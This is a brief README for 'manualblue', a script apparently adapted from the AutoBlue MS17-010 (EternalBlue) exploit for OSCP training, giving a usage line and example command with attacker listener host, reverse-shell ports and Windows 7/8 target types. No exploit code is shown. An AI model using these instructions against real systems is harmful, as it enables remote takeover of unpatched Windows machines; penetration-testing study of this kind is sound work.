# manualblue
## A variant of [AutoBlue-MS17-010](https://github.com/3ndG4me/AutoBlue-MS17-010) by [3ndG4me](https://github.com/3ndG4me/), modified even further for OSCP compliance.

### Version: 0.6:
- This version is not working consistently, use at your own risk.
    - Pull requests welcome
    - Must have Terminator installed

## Usage:
`./manualblue.sh LHOST 64_LPORT 86_LPORT TARGETIP TARGET_TYPE`

- TARGET_TYPE:
    - [0] - Windows 7/Server 2008
    - [1] - Windows 8
### Example:
`./manualblue.sh 10.10.10.10 4446 4443 10.10.10.11 0`